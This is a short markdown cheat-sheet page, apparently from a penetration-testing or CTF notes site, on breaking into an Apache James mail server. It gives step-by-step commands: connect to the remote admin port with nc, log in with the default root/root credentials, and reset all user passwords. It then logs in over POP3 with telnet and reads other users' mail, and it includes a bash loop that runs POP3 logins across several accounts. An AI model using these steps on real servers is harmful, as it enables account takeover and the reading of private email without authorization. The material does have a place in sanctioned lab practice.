---
title: James POP3
parent: General Usage
layout: default
nav_order: 21
---

1. First need to reset the password. Login to James remote admin via nc: `nc IP PORT` (default 4555). Then login using root root. `help` to see the commands. reset all user password.
2. Use telnet to interact with the POP3 server: `telnet IP PORT` (default 110)
3. then login using:
   `user username`
   `pass password`
4. Show emails using `list`
5. Optional two liner bash to see which person has email content: 
   ```
   for user in user1 user2 user3 user4 user5 user6; do
    ( echo USER ${user}; sleep 2s; echo PASS password; sleep 2s; echo LIST; sleep 2s; echo quit) | nc -nvC IP PORT;  done
   ```
6. If got a list, use `retr number` to read the email listed. (eg `retr 1`, `retr 2`)